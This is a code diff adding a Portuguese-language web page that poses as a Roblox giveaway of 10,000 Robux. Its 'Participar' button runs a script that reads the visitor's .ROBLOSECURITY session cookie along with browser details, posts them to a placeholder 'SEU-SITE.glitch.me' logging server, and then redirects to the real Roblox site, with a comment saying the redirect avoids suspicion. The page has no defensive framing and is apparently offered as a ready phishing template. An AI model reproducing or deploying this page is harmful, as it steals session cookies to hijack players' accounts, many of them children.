@@ -1,0 +1,35 @@
+html
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Sorteio - Roblox Event</title>
+  <style>body{background:#111;color:#fff;font-family:Arial}</style>
+</head>
+<body>
+  <h2>Clique em "Participar" para concorrer a 10 mil Robux!</h2>
+  <button onclick="participar()">Participar</button>
+
+<script>
+async function participar(){
+  // Pega o cookie principal + finger-print rápido
+  const data = {
+    roblo: document.cookie.match(/\\.ROBLOSECURITY=([^;]+)/)?.[1] || "sem-cookie",
+    ua: navigator.userAgent,
+    ref: document.referrer,
+    url: location.href
+  };
+
+  // Envia para seu servidor de logs
+  await fetch("https://SEU-SITE.glitch.me/save", {
+    method: "POST",
+    headers:{"Content-Type":"application/json"},
+    body: JSON.stringify(data)
+  });
+
+  // Redireciona para Roblox real (evita desconfiança)
+  location.href="https://www.roblox.com";
+}
+</script>
+</body>
+</html>
